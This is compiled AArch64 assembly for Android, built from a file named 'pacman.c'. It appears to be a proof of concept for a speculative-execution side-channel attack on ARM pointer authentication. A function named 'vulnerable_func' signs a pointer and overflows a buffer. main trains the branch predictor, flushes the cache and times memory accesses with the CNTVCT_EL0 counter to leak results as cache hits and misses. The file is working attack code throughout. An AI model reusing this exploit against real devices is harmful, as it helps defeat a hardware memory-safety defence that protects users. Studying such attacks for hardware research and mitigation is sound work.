	.text
	.section	.note.gnu.property,"a",@note
	.p2align	3, 0x0
	.word	4
	.word	16
	.word	5
	.asciz	"GNU"
	.word	3221225472
	.word	4
	.word	3
	.word	0
.Lsec_end0:
	.text
	.file	"pacman.c"
	.globl	vulnerable_func                 // -- Begin function vulnerable_func
	.p2align	2
	.type	vulnerable_func,@function
vulnerable_func:                        // @vulnerable_func
	.cfi_startproc
// %bb.0:
	paciasp
	.cfi_negate_ra_state
	sub	sp, sp, #96
	.cfi_def_cfa_offset 96
	stp	x29, x30, [sp, #16]             // 16-byte Folded Spill
	stp	x26, x25, [sp, #32]             // 16-byte Folded Spill
	stp	x24, x23, [sp, #48]             // 16-byte Folded Spill
	stp	x22, x21, [sp, #64]             // 16-byte Folded Spill
	stp	x20, x19, [sp, #80]             // 16-byte Folded Spill
	add	x29, sp, #16
	.cfi_def_cfa w29, 80
	.cfi_offset w19, -8
	.cfi_offset w20, -16
	.cfi_offset w21, -24
	.cfi_offset w22, -32
	.cfi_offset w23, -40
	.cfi_offset w24, -48
	.cfi_offset w25, -56
	.cfi_offset w26, -64
	.cfi_offset w30, -72
	.cfi_offset w29, -80
	mov	x21, x0
	mov	w0, #64                         // =0x40
	mov	w20, w4
	mov	w24, w3
	mov	x23, x2
	mov	x22, x1
	bl	malloc
	cbz	x0, .LBB0_10
// %bb.1:
	ldr	q0, [x23]
	mov	x19, x0
	strb	wzr, [x0, #24]
	str	q0, [x0]
	mov	w0, #24                         // =0x18
	bl	malloc
	sxtw	x8, w24
	mul	x26, x8, x22
	mov	x22, x0
	add	x25, x21, x26
	//APP
	pacdza	x25

	//NO_APP
	str	x25, [x0, #16]
	adrp	x0, .L.str
	add	x0, x0, :lo12:.L.str
	mov	x1, x25
	bl	printf
	str	x25, [x19, #16]
	//APP
	dsb	ish
	//NO_APP
	//APP
	isb
	//NO_APP
	stur	wzr, [x29, #-4]
	cbz	w24, .LBB0_3
// %bb.2:
	ldr	q0, [x19]
	ldr	x8, [x19, #16]
	str	q0, [x22]
	str	x8, [x22, #16]
.LBB0_3:
	//APP
	dc	civac, x23
	//NO_APP
	mov	x0, x23
	//APP
	dsb	ish
	//NO_APP
	//APP
	isb
	//NO_APP
	//APP
	dsb	ish
	//NO_APP
	//APP
	isb
	//NO_APP
	bl	strlen
	cmp	x0, #9
	b.hi	.LBB0_8
// %bb.4:
	ldr	x8, [x22, #16]
	cmp	w20, #1
	//APP
	autdza	x8

	//NO_APP
	ldr	w9, [x8]
	ldur	w10, [x29, #-4]
	lsl	x8, x26, #1
	eor	w9, w10, w9
	stur	w9, [x29, #-4]
	b.lt	.LBB0_7
// %bb.5:
	mov	x9, xzr
.LBB0_6:                                // =>This Inner Loop Header: Depth=1
	subs	w20, w20, #1
	//APP
	orr	x9, x9, x9

	//NO_APP
	b.ne	.LBB0_6
.LBB0_7:
	ldr	w8, [x21, x8]
	ldur	w9, [x29, #-4]
	eor	w8, w9, w8
	stur	w8, [x29, #-4]
	b	.LBB0_9
.LBB0_8:
	adrp	x0, .Lstr
	add	x0, x0, :lo12:.Lstr
	bl	puts
.LBB0_9:
	mov	x0, x19
	bl	free
	mov	x0, x22
	bl	free
.LBB0_10:
	.cfi_def_cfa wsp, 96
	ldp	x20, x19, [sp, #80]             // 16-byte Folded Reload
	ldp	x22, x21, [sp, #64]             // 16-byte Folded Reload
	ldp	x24, x23, [sp, #48]             // 16-byte Folded Reload
	ldp	x26, x25, [sp, #32]             // 16-byte Folded Reload
	ldp	x29, x30, [sp, #16]             // 16-byte Folded Reload
	add	sp, sp, #96
	.cfi_def_cfa_offset 0
	.cfi_restore w19
	.cfi_restore w20
	.cfi_restore w21
	.cfi_restore w22
	.cfi_restore w23
	.cfi_restore w24
	.cfi_restore w25
	.cfi_restore w26
	.cfi_restore w30
	.cfi_restore w29
	retaa
.Lfunc_end0:
	.size	vulnerable_func, .Lfunc_end0-vulnerable_func
	.cfi_endproc
                                        // -- End function
	.globl	main                            // -- Begin function main
	.p2align	2
	.type	main,@function
main:                                   // @main
	.cfi_startproc
// %bb.0:
	paciasp
	.cfi_negate_ra_state
	sub	sp, sp, #224
	.cfi_def_cfa_offset 224
	stp	x29, x30, [sp, #144]            // 16-byte Folded Spill
	str	x25, [sp, #160]                 // 8-byte Folded Spill
	stp	x24, x23, [sp, #176]            // 16-byte Folded Spill
	stp	x22, x21, [sp, #192]            // 16-byte Folded Spill
	stp	x20, x19, [sp, #208]            // 16-byte Folded Spill
	add	x29, sp, #144
	.cfi_def_cfa w29, 80
	.cfi_offset w19, -8
	.cfi_offset w20, -16
	.cfi_offset w21, -24
	.cfi_offset w22, -32
	.cfi_offset w23, -40
	.cfi_offset w24, -48
	.cfi_offset w25, -64
	.cfi_offset w30, -72
	.cfi_offset w29, -80
	.cfi_remember_state
	cmp	w0, #2
	b.lt	.LBB1_6
// %bb.1:
	mov	x19, x1
	str	xzr, [sp, #16]
	bl	__errno
	str	wzr, [x0]
	mov	x20, x0
	add	x1, sp, #16
	ldr	x0, [x19, #8]
	mov	w2, #10                         // =0xa
	bl	strtol
	ldr	w8, [x20]
	ldr	x2, [x19, #8]
	cbnz	w8, .LBB1_5
// %bb.2:
	ldr	x8, [sp, #16]
	cmp	x8, x2
	b.eq	.LBB1_5
// %bb.3:
	ldrb	w8, [x8]
	cbnz	w8, .LBB1_5
// %bb.4:
	bic	x8, x0, x0, asr #63
	mov	w9, #200                        // =0xc8
	cmp	x8, #200
	csel	x21, x8, x9, lo
	b	.LBB1_7
.LBB1_5:
	adrp	x8, :got:stderr
	adrp	x1, .L.str.2
	add	x1, x1, :lo12:.L.str.2
	ldr	x8, [x8, :got_lo12:stderr]
	ldr	x0, [x8]
	bl	fprintf
.LBB1_6:
	mov	w21, wzr
.LBB1_7:
	movi	v0.2d, #0000000000000000
	mov	w8, #128                        // =0x80
	add	x2, sp, #16
	mov	w0, wzr
	mov	w1, #128                        // =0x80
	str	xzr, [sp, #136]
	str	x8, [sp, #16]
	stur	q0, [sp, #120]
	stur	q0, [sp, #104]
	stur	q0, [sp, #88]
	stur	q0, [sp, #72]
	stur	q0, [sp, #56]
	stur	q0, [sp, #40]
	stur	q0, [sp, #24]
	bl	sched_setaffinity
	cbnz	w0, .LBB1_17
.LBB1_8:
	mov	w0, #39                         // =0x27
	bl	sysconf
	lsl	x19, x0, #8
	mov	x22, x0
	mov	x0, xzr
	mov	w2, #3                          // =0x3
	mov	w3, #34                         // =0x22
	mov	w4, #-1                         // =0xffffffff
	mov	x1, x19
	mov	x5, xzr
	bl	mmap
	cmn	x0, #1
	b.eq	.LBB1_18
// %bb.9:
	mov	w1, #16                         // =0x10
	mov	x2, x19
	mov	x20, x0
	bl	memset
	add	x8, x22, #23
	add	x0, sp, #16
	mov	x1, x22
	udiv	x8, x8, x22
	str	xzr, [sp, #16]
	mul	x23, x8, x22
	mov	x2, x23
	bl	posix_memalign
	cbnz	w0, .LBB1_19
// %bb.10:
	ldr	x0, [sp, #16]
	mov	w1, wzr
	mov	x2, x23
	bl	memset
	adrp	x8, main.prefix_bytes
	add	x8, x8, :lo12:main.prefix_bytes
	ldr	x9, [sp, #16]
	ldr	x10, [x8]
	mov	w8, #100                        // =0x64
	mov	w11, #14648                     // =0x3938
	mul	x8, x22, x8
	adrp	x24, test_ptr
	strh	w11, [x9, #8]
	str	x10, [x9]
	mov	w10, #16705                     // =0x4141
	cmp	x22, #1
	movk	w10, #16705, lsl #16
	str	x9, [x24, :lo12:test_ptr]
	stur	w10, [x9, #10]
	strh	w10, [x9, #14]
	add	x10, x8, x20
	str	x10, [x9, #16]
	str	wzr, [x29, #24]
	//APP
	dsb	ish
	//NO_APP
	//APP
	isb
	//NO_APP
	b.lt	.LBB1_13
// %bb.11:
	mov	x9, xzr
.LBB1_12:                               // =>This Inner Loop Header: Depth=1
	add	x10, x20, x9
	//APP
	dc	civac, x10
	//NO_APP
	add	x9, x9, #64
	//APP
	dsb	ish
	//NO_APP
	cmp	x19, x9
	//APP
	isb
	//NO_APP
	b.gt	.LBB1_12
.LBB1_13:
	add	x23, x20, x8
	//APP
	dc	civac, x23
	//NO_APP
	add	x0, sp, #8
	//APP
	dsb	ish
	//NO_APP
	mov	w1, #128                        // =0x80
	mov	w2, #67108864                   // =0x4000000
	//APP
	isb
	//NO_APP
	bl	posix_memalign
	ldr	x8, [sp, #8]
	mov	x9, xzr
	mov	w10, #67108736                  // =0x3ffff80
	strb	wzr, [x29, #28]
.LBB1_14:                               // =>This Inner Loop Header: Depth=1
	ldrb	w11, [x8, x9]
	ldrb	w12, [x29, #28]
	cmp	x9, x10
	add	x9, x9, #128
	eor	w11, w12, w11
	strb	w11, [x29, #28]
	b.lo	.LBB1_14
// %bb.15:
	//APP
	//NO_APP
	adrp	x25, safe_str
	mov	x0, x20
	ldrb	w8, [x29, #28]
	//APP
	dsb	ish
	//NO_APP
	mov	x1, x22
	//APP
	isb
	//NO_APP
	mov	w3, wzr
	mov	w4, w21
	ldr	x2, [x25, :lo12:safe_str]
	//APP
	dsb	ish
	isb

	//NO_APP
	bl	vulnerable_func
	ldr	x2, [x25, :lo12:safe_str]
	//APP
	dsb	ish
	isb

	//NO_APP
	mov	x0, x20
	mov	x1, x22
	mov	w3, wzr
	mov	w4, w21
	bl	vulnerable_func
	ldr	x2, [x25, :lo12:safe_str]
	//APP
	dsb	ish
	isb

	//NO_APP
	mov	x0, x20
	mov	x1, x22
	mov	w3, wzr
	mov	w4, w21
	bl	vulnerable_func
	ldr	x2, [x25, :lo12:safe_str]
	//APP
	dsb	ish
	isb

	//NO_APP
	mov	x0, x20
	mov	x1, x22
	mov	w3, wzr
	mov	w4, w21
	bl	vulnerable_func
	ldr	x2, [x25, :lo12:safe_str]
	//APP
	dsb	ish
	isb

	//NO_APP
	mov	x0, x20
	mov	x1, x22
	mov	w3, wzr
	mov	w4, w21
	bl	vulnerable_func
	ldr	x2, [x25, :lo12:safe_str]
	//APP
	dsb	ish
	isb

	//NO_APP
	mov	x0, x20
	mov	x1, x22
	mov	w3, wzr
	mov	w4, w21
	bl	vulnerable_func
	ldr	x2, [x24, :lo12:test_ptr]
	//APP
	dsb	ish
	isb

	//NO_APP
	mov	x0, x20
	mov	x1, x22
	mov	w3, #100                        // =0x64
	mov	w4, w21
	bl	vulnerable_func
	mov	w21, #51712                     // =0xca00
	//APP
	dsb	ish
	isb

	//NO_APP
	//APP
	isb
	//NO_APP
	//APP
	mrs	x8, CNTVCT_EL0
	//NO_APP
	movk	w21, #15258, lsl #16
	//APP
	mrs	x9, CNTFRQ_EL0
	//NO_APP
	mul	x8, x8, x21
	adrp	x0, .L.str.5
	add	x0, x0, :lo12:.L.str.5
	udiv	x8, x8, x9
	mov	w9, #200                        // =0xc8
	mul	x9, x22, x9
	ldr	w9, [x20, x9]
	ldr	w10, [x29, #24]
	eor	w9, w10, w9
	str	w9, [x29, #24]
	//APP
	isb
	//NO_APP
	//APP
	mrs	x9, CNTVCT_EL0
	//NO_APP
	mul	x9, x9, x21
	//APP
	mrs	x10, CNTFRQ_EL0
	//NO_APP
	udiv	x9, x9, x10
	sub	x1, x9, x8
	bl	printf
	//APP
	dc	civac, x23
	//NO_APP
	adrp	x0, .L.str.6
	add	x0, x0, :lo12:.L.str.6
	//APP
	dsb	ish
	//NO_APP
	//APP
	isb
	//NO_APP
	//APP
	isb
	//NO_APP
	//APP
	mrs	x8, CNTVCT_EL0
	//NO_APP
	mul	x8, x8, x21
	//APP
	mrs	x9, CNTFRQ_EL0
	//NO_APP
	udiv	x8, x8, x9
	mov	w9, #50                         // =0x32
	mul	x22, x22, x9
	ldr	w9, [x20, x22]
	ldr	w10, [x29, #24]
	eor	w9, w10, w9
	str	w9, [x29, #24]
	//APP
	isb
	//NO_APP
	//APP
	mrs	x9, CNTVCT_EL0
	//NO_APP
	mul	x9, x9, x21
	//APP
	mrs	x10, CNTFRQ_EL0
	//NO_APP
	udiv	x9, x9, x10
	sub	x1, x9, x8
	bl	printf
	//APP
	isb
	//NO_APP
	//APP
	mrs	x8, CNTVCT_EL0
	//NO_APP
	//APP
	mrs	x9, CNTFRQ_EL0
	//NO_APP
	mul	x8, x8, x21
	adrp	x0, .L.str.7
	add	x0, x0, :lo12:.L.str.7
	udiv	x8, x8, x9
	ldr	w9, [x20, x22]
	ldr	w10, [x29, #24]
	eor	w9, w10, w9
	str	w9, [x29, #24]
	//APP
	isb
	//NO_APP
	//APP
	mrs	x9, CNTVCT_EL0
	//NO_APP
	mul	x9, x9, x21
	//APP
	mrs	x10, CNTFRQ_EL0
	//NO_APP
	udiv	x9, x9, x10
	sub	x1, x9, x8
	bl	printf
	mov	x0, x20
	mov	x1, x19
	bl	munmap
	adrp	x8, obj
	ldr	x0, [x8, :lo12:obj]
	bl	free
	ldr	x0, [sp, #16]
	bl	free
	mov	w0, wzr
.LBB1_16:
	.cfi_def_cfa wsp, 224
	ldp	x20, x19, [sp, #208]            // 16-byte Folded Reload
	ldr	x25, [sp, #160]                 // 8-byte Folded Reload
	ldp	x22, x21, [sp, #192]            // 16-byte Folded Reload
	ldp	x24, x23, [sp, #176]            // 16-byte Folded Reload
	ldp	x29, x30, [sp, #144]            // 16-byte Folded Reload
	add	sp, sp, #224
	.cfi_def_cfa_offset 0
	.cfi_restore w19
	.cfi_restore w20
	.cfi_restore w21
	.cfi_restore w22
	.cfi_restore w23
	.cfi_restore w24
	.cfi_restore w25
	.cfi_restore w30
	.cfi_restore w29
	retaa
.LBB1_17:
	.cfi_restore_state
	adrp	x0, .L.str.9
	add	x0, x0, :lo12:.L.str.9
	bl	perror
	b	.LBB1_8
.LBB1_18:
	adrp	x0, .L.str.3
	add	x0, x0, :lo12:.L.str.3
	b	.LBB1_20
.LBB1_19:
	adrp	x0, .L.str.4
	add	x0, x0, :lo12:.L.str.4
.LBB1_20:
	bl	perror
	mov	w0, #1                          // =0x1
	b	.LBB1_16
.Lfunc_end1:
	.size	main, .Lfunc_end1-main
	.cfi_endproc
                                        // -- End function
	.type	safe_str_buf,@object            // @safe_str_buf
	.data
safe_str_buf:
	.asciz	"0123456\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000"
	.size	safe_str_buf, 32

	.type	safe_str,@object                // @safe_str
	.globl	safe_str
	.p2align	3, 0x0
safe_str:
	.xword	safe_str_buf
	.size	safe_str, 8

	.type	test_ptr,@object                // @test_ptr
	.bss
	.globl	test_ptr
	.p2align	3, 0x0
test_ptr:
	.xword	0
	.size	test_ptr, 8

	.type	temp,@object                    // @temp
	.globl	temp
temp:
	.byte	0                               // 0x0
	.size	temp, 1

	.type	.L.str,@object                  // @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"before bof : %p\n"
	.size	.L.str, 17

	.type	.L.str.2,@object                // @.str.2
.L.str.2:
	.asciz	"Invalid ORR count '%s'; falling back to 0\n"
	.size	.L.str.2, 43

	.type	.L.str.3,@object                // @.str.3
.L.str.3:
	.asciz	"mmap"
	.size	.L.str.3, 5

	.type	main.prefix_bytes,@object       // @main.prefix_bytes
main.prefix_bytes:
	.asciz	"0123456789"
	.size	main.prefix_bytes, 11

	.type	.L.str.4,@object                // @.str.4
.L.str.4:
	.asciz	"posix_memalign malicious_payload"
	.size	.L.str.4, 33

	.type	.L.str.5,@object                // @.str.5
.L.str.5:
	.asciz	"transient data access: %llu\n"
	.size	.L.str.5, 29

	.type	.L.str.6,@object                // @.str.6
.L.str.6:
	.asciz	"cache miss : %llu\n"
	.size	.L.str.6, 19

	.type	.L.str.7,@object                // @.str.7
.L.str.7:
	.asciz	"cache hit : %llu\n"
	.size	.L.str.7, 18

	.type	obj,@object                     // @obj
	.bss
	.globl	obj
	.p2align	3, 0x0
obj:
	.xword	0
	.size	obj, 8

	.type	.L.str.9,@object                // @.str.9
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.9:
	.asciz	"sched_setaffinity"
	.size	.L.str.9, 18

	.type	.Lstr,@object                   // @str
.Lstr:
	.asciz	"transient"
	.size	.Lstr, 10

	.ident	"Android (12470979, +pgo, +bolt, +lto, +mlgo, based on r522817c) clang version 18.0.3 (https://android.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)"
	.section	".note.GNU-stack","",@progbits
